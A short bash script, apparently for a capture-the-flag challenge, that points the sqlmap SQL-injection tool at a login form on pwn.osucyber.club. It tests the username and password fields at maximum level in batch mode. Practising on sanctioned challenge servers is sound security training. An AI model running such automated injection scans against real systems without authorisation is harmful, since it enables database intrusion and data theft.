#!/usr/bin/env bash
python3 ~/Programs/archive/sqlmap-dev/sqlmap.py -u "http://pwn.osucyber.club:13370/login" --method=POST \
    --data="username=admin&password=password" \
    -p username,password \
    --level=5 \
    --batch
